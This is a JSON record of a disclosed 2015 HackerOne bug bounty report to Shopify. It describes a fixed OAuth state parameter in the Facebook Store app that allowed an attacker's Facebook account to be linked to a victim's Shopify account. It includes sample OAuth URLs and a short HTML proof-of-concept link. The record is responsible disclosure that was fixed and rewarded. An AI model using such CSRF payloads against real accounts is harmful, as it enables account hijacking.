{"id":55911,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NTkxMQ==","url":"https://hackerone.com/reports/55911","title":"CSRF token fixation in facebook store app that can lead to adding attacker to victim acc ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-11T14:06:20.330Z","submitted_at":"2015-04-11T14:06:20.330Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"defmax","url":"/defmax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-06-25T20:05:05.521Z","bug_reporter_agreed_on_going_public_at":"2015-06-25T20:05:05.204Z","team_member_agreed_on_going_public_at":"2015-06-09T21:57:54.465Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hey guys\r\n\r\ni just found  an csrf token  fixation in facebook store app  which is an offical  shopify app \r\n\r\nlink \u003e\u003e https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store\r\n\r\n\r\nThe CSRF bug which connects attacker's Facebook account to victim's shopify  account. This is done by exploiting 'Connect with Facebook' function.\r\n\r\nWhen using 'Connect with Facebook' function. A request is sent to facebook to authorize the shopify app. After authorizing a 'access token' is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token \"state parameter \" \r\n\r\nhere state parameter is getting fixed here \r\n\r\n1st oauth request \r\n\r\nhttps://graph.facebook.com/oauth/authorize?client_id=410312912374011\u0026display=popup\u0026redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated\u0026response_type=code\u0026scope=manage_pages+email\u0026state=c2f449f2df5ee64df6173702846bce72e3a57319\r\n\r\nthen when it autorized , we will get this  get !\r\n\r\n\r\nhttps://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw\u0026state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\r\n\r\n\r\nnow how many times you  autorize the state parameter will be same !  once the attacker gets state parameter by xss or any method , he can make csrf lifelong posible \r\n\r\nexploit code \r\n\r\n```\r\n\u003chtml\u003e\r\n\u003cbody\u003e\r\n\u003ca href=https://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token ]\u0026state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\u003e\r\n\u003c/body\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\nhope this bug will be fixed soon","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-07-09T21:57:54.672Z","allow_singular_disclosure_after":-197485989.61010858,"singular_disclosure_allowed":true,"vote_count":1,"voters":["drsniper"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":386515,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks, I managed to replicate the bug. Our team is investigating.","automated_response":false,"created_at":"2015-04-21T16:38:00.405Z","updated_at":"2015-04-21T16:38:00.405Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":448261,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"This vulnerability has been fixed. Thanks for helping improve the security of Shopify!","automated_response":false,"created_at":"2015-06-09T21:57:36.593Z","updated_at":"2015-06-09T21:57:36.593Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"defmax","url":"/defmax"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":448262,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2015-06-09T21:57:48.232Z","updated_at":"2015-06-09T21:57:48.232Z","actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"defmax","url":"/defmax"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":448264,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-06-09T21:57:54.499Z","updated_at":"2015-06-09T21:57:54.499Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":491930,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-06-25T20:05:05.248Z","updated_at":"2015-06-25T20:05:05.248Z","actor":{"username":"defmax","cleared":false,"url":"/defmax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":491931,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-06-25T20:05:05.553Z","updated_at":"2015-06-25T20:05:05.553Z","actor":{"username":"defmax","cleared":false,"url":"/defmax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":214,"category":"researcher","content":"haha sorry for the template @pranav_hivarekar:p ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2759,"username":"defmax","name":"N B Sri Harsh–∞","bio":"Passionate web application security researcher. bug bounty hunter. Ctf with securisec. Founder of defmax","cleared":false,"website":"https://defmax.io","location":"Hyderabad","created_at":"2014-02-15T13:00:21.851Z","url":"https://hackerone.com/defmax","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}